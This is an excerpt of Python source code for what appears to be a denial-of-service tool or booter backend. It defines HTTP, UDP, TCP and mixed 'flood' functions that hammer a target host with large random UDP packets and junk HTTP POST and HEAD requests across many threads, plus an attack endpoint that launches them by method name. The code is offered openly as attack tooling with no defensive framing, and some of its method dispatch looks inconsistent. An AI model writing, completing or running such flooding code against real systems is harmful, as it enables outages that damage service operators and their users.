...
def http_flood(target, port, duration, threads):
    aid = hashlib.md5(f"http{target}{time.time()}".encode()).hexdigest()[:8]
...
def snow_flood(target, port, duration, threads):
    """Snow Flood - Heavy Multi-Protocol Attack"""
    aid = hashlib.md5(f"snow{target}{time.time()}".encode()).hexdigest()[:8]
    active_attacks[aid] = {'target': target, 'type': 'SNOW', 'status': 'running'}
    ...
    def snow_worker():
        ...
        while time.time() < end:
            ...
            try:
                # UDP Flood with random sizes
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                size = random.choice([1024, 2048, 4096, 8192, 16384, 32768, 65500])
                s.sendto(random._urandom(size), (target, port))
                s.close()
            except: pass
            ...
            try:
                ...
                payload = random.choice([
                    ...
                    f"POST /{random.randint(1,999999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Length: {random.randint(100,5000)}\r\nConnection: keep-alive\r\n\r\n{random._urandom(random.randint(100,5000)).hex()}",
                    f"HEAD /{random.randint(1,999999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: keep-alive\r\n\r\n",
                ])
    ...
    for _ in range(threads):
        executor.submit(snow_worker)
    return aid

def mixed_flood(target, port, duration, threads):
    """Mixed Flood - HTTP + UDP + TCP"""
    aid = hashlib.md5(f"mixed{target}{time.time()}".encode()).hexdigest()[:8]
    active_attacks[aid] = {'target': target, 'type': 'MIXED', 'status': 'running'}
    
    methods = ['http', 'udp', 'syn']
        ...
        while time.time() < end:
            ...
            try:
                if m == 'http':
                    ...
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(random._urandom(random.choice([1024,4096,8192,65500])), (target, port))
                    s.close()
                elif m == 'syn':
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
...
def attack():
    ...
    if method == 'http':
        ...
        aid = snow_flood(target, port, duration, threads)
    elif method == 'mixed':
        aid = mixed_flood(target, port, duration, threads)
    else:
        return jsonify({'error': 'Use: http, udp, snow, mixed'}), 400
